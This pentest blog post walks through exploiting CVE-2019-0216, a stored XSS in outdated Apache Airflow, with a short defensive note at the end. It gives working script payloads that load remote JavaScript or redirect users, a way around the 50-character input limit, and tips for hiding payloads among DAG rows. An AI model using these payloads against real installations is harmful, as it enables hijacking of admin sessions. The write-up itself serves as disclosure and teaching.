<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>CVE-2019-0216: Stored XSS in Apache Airflow | -pentest notes-</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="CVE-2019-0216: Stored XSS in Apache Airflow" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Motivation" />
<meta property="og:description" content="Motivation" />
<link rel="canonical" href="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" />
<meta property="og:url" content="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" />
<meta property="og:site_name" content="-pentest notes-" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-16T00:00:00-06:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html","headline":"CVE-2019-0216: Stored XSS in Apache Airflow","dateModified":"2020-06-16T00:00:00-06:00","datePublished":"2020-06-16T00:00:00-06:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html"},"description":"Motivation","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="-pentest notes-" /><meta name="google-site-verification" content="nlJMfC4WayD_vnFDQ8FYEK1U0EBzlyFHO-Zioe4MvBs" />
</head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">-pentest notes-</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">about</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">CVE-2019-0216: Stored XSS in Apache Airflow</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-06-16T00:00:00-06:00" itemprop="datePublished">2020-06-16
      </time></p>
  </header>
 
  <div class="post-content e-content" itemprop="articleBody">
 	<p><strong>standard disclaimer</strong>: anything shown here is only to be used for education and research, or on networks/systems for which you've been give explicit permission to test -- hacking without permission is illegal.
	  <ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#motivation">Motivation</a></li>
<li class="toc-entry toc-h1"><a href="#prerequisites">Prerequisites</a></li>
<li class="toc-entry toc-h1"><a href="#exploiting">Exploiting</a></li>
<li class="toc-entry toc-h1"><a href="#if-youre-defending">If You’re Defending</a></li>
</ul><h1 id="motivation">
<a class="anchor" href="#motivation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Motivation</h1>

<p>A while back I (and several other researchers concurrently) reported CVE-2019-0216 to Apache – a stored XSS in Apache Airflow. Airflow is a workflow orchestration platform, and isn’t uncommon to come across on an engagement. If you find an older installation there is a fun opportunity for getting stored XSS.</p>

<h1 id="prerequisites">
<a class="anchor" href="#prerequisites" aria-hidden="true"><span class="octicon octicon-link"></span></a>Prerequisites</h1>

<p>If the installation is out-of-date (&lt; 1.10.3 according to Apache), it is theoretically vulnerable (though I can’t currently reproduce against manual out-of-date installs from PyPI due to some severe dependency drift). In any case, Airflow suffered from this vulnerability in late February 2019 when it was reported to Apache.</p>

<p>Additionally, the CVE describes the vuln as being possibly exploited by a ‘malicious admin’, which is technically true, however auth is disabled by default. So if auth has been enabled, you’ll need credentials to perform the attack.</p>

<h1 id="exploiting">
<a class="anchor" href="#exploiting" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploiting</h1>

<p>Visit the <code class="language-plaintext highlighter-rouge">/admin/dagrun/</code> endpoint (by default not password protected).</p>

<p>If there aren’t a few “DAG runs” listed, create a few, giving them any ID, and leave the state as ‘running’.</p>

<p><img src="/screens/airflow-bogus-ids.png" alt=""></p>

<p>Back on the listing screen, you’ll notice that you can click on the ‘running’ status indicator and input HTML.</p>

<p><img src="/screens/airflow-inject-script.png" alt=""></p>

<p>The input is limited to 50 characters, which I believe was intended as an XSS defense, however this is easily overcome.</p>

<p>If you own a short domain, you can use the protocol inheritance and a short script name to just directly include your payload. Something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="//127.0.0.1/j.js"&gt;&lt;/script&gt;
</code></pre></div></div>

<p>Or, using variables, string concatenation, etc., you can glue a script together in separate rows of the table.</p>

<p>A simple example would be something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;_a="https://b4ny4n.github.io"&lt;/script&gt;
</code></pre></div></div>

<p>… and then</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;document.location=_a&lt;/script&gt; 
</code></pre></div></div>

<p>As you save the rows, they’re properly escaped into the page:</p>

<p><img src="/screens/airflow-pre-render.png" alt=""></p>

<p>But on a fresh load of the page the content will be directly injected into the DOM:</p>

<p><img src="/screens/airflow-output.png" alt=""></p>

<p>At this point you can drop your favorite xss payload. Depending on the state of the airflow installation (there could be many, many DAGs) you can also hide your payloads throughout rows below the page fold to be less obvious.</p>

<h1 id="if-youre-defending">
<a class="anchor" href="#if-youre-defending" aria-hidden="true"><span class="octicon octicon-link"></span></a>If You’re Defending</h1>

<p>These kinds of issues are best prevented by a good scanning + patching cadence and basic password hygiene (like enabling authentication, and requiring strong passwords).</p>

  </div><a class="u-url" href="/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">-pentest notes-</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">-pentest notes-</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/b4ny4n"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">b4ny4n</span></a></li><li><a href="https://www.twitter.com/b4ny4n"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">b4ny4n</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>some security-related notes from the field, hopefully of use to other attackers/defenders...</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
